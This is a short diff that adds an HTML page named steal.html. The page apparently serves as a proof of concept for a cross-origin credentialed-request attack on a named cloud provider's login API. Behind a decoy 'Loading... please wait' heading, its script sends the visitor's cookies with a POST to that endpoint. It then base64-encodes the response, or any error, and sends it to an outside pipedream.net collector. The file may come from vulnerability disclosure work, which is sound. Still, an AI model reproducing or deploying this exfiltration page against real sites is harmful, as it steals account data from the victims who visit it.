@@ -1,0 +1,24 @@
+<!-- steal.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Loading... please wait</h1>
+    <script>
+      fetch("https://api.e2enetworks.com/myaccount/publicapi/v1/accounts/login/", {
+        method: "POST",
+        credentials: "include", // <-- sends victim's cookies
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({})
+      })
+      .then(response => response.text())
+      .then(data => {
+        fetch("https://eolo31bscyaonf7.m.pipedream.net/?data=" + btoa(data));
+      })
+      .catch(error => {
+        fetch("https://eolo31bscyaonf7.m.pipedream.net/?error=" + btoa(error.message));
+      });
+    </script>
+  </body>
+</html>
